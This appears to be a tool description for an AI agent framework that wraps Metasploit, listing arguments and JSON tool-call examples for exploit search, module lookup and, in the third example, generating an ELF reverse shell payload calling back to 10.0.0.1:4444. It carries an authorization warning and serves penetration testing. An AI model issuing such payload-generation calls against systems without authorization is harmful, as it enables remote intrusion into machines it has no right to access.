### metasploit_tool:
Metasploit Framework for exploitation and payload generation. Professional penetration testing tool.

⚠️ Only use on systems you own or have explicit written authorization to test.

#### Arguments:
 *  "action" (string) : Action to perform: "search", "info", "generate_payload"
 *  "query" (Optional, string) : Search query for exploits
 *  "module" (Optional, string) : Module path for info
 *  "payload" (Optional, string) : Payload type for generation (e.g., "linux/x64/shell_reverse_tcp")
 *  "lhost" (Optional, string) : Local host IP for payload
 *  "lport" (Optional, string) : Local port for payload (default: 4444)
 *  "format" (Optional, string) : Output format (elf, exe, raw, etc.)

#### Usage examples:
##### 1: Search for exploits
\`\`\`json
{
    "thoughts": ["Finding exploits for specific service"],
    "tool_name": "metasploit_tool",
    "tool_args": {
        "action": "search",
        "query": "apache 2.4"
    }
}
\`\`\`

##### 2: Get module info
\`\`\`json
{
    "thoughts": ["Getting details about specific exploit"],
    "tool_name": "metasploit_tool",
    "tool_args": {
        "action": "info",
        "module": "exploit/multi/handler"
    }
}
\`\`\`

##### 3: Generate reverse shell payload
\`\`\`json
{
    "thoughts": ["Creating reverse shell for authorized test"],
    "tool_name": "metasploit_tool",
    "tool_args": {
        "action": "generate_payload",
        "payload": "linux/x64/shell_reverse_tcp",
        "lhost": "10.0.0.1",
        "lport": "4444",
        "format": "elf"
    }
}
\`\`\`
